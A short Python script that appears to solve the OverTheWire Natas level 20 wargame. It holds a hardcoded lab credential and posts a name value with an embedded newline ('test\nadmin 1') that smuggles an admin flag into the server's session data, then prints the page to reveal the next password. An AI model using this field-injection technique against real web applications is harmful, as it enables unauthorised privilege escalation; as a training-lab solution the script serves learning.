# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = f'http://{username}.natas.labs.overthewire.org/?debug=true'
pw = []
flag = True
characters = ascii_letters + digits + '-'

# Connect to natas
session = requests.Session()
payloads = {"name": 'test\nadmin 1'}
cookies = {}
response = session.request('POST', url, auth=(username, password),
                                 data=payloads, cookies=cookies)
response = session.request('POST', url, auth=(username, password),
                                 data=payloads, cookies=cookies)

#print(''.join(pw))

# Filtering to get a password
result = response.text
#result = re.findall('Password: (.*)</pre>', response.text)[0]
print(result)
